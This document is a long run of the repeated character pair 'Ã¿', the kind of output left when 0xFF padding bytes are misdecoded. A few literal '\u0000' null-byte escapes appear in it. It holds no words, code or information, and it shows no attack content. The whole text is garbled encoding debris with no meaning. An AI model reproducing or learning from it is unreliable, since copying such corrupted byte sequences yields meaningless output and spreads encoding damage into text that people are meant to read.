¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿